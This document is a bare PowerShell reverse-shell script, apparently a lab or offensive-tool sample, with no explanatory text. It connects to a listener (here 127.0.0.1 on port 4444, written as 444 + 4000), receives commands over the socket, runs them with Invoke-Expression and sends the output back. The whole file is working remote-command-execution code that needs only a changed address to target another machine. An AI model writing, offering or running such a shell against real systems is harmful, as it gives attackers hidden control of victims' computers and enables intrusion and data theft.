# Define connection parameters
$port = 444 + 4000  # Port 4444
$serverIP = '127.0.0.1' # Server IP

try {
    # Create TCP client and connect
    $tcpClient = New-Object Net.Sockets.TCPClient($serverIP, $port)
    $stream = $tcpClient.GetStream()
    
    # Create stream reader and writer
    $streamReader = New-Object IO.StreamReader($stream)
    $streamWriter = New-Object IO.StreamWriter($stream)
    $streamWriter.AutoFlush = $true
    
    # Create buffer for reading data
    $buffer = New-Object System.Byte[] 1024
    $receivedData = ""

    # Main communication loop
    while ($tcpClient.Connected) {
        # Check if data is available to read
        if ($stream.DataAvailable) {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            $receivedData = ([text.encoding]::UTF8).GetString($buffer, 0, $bytesRead)
        }
        
        # Process received commands
        if ($tcpClient.Connected -and $receivedData.Length -gt 0) {
            try {
                # Execute command and capture output
                $output = Invoke-Expression $receivedData 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message | Out-String
            }
            
            # Send response back
            $streamWriter.Write($output + "`n")
            $receivedData = ""
        }
        
        # Small delay to prevent high CPU usage
        Start-Sleep -Milliseconds 100
    }
} catch {
    Write-Error "Connection error: $($_.Exception.Message)"
} finally {
    # Clean up resources
    if ($streamWriter) { $streamWriter.Close() }
    if ($streamReader) { $streamReader.Close() }
    if ($stream) { $stream.Close() }
    if ($tcpClient) { $tcpClient.Close() }
}


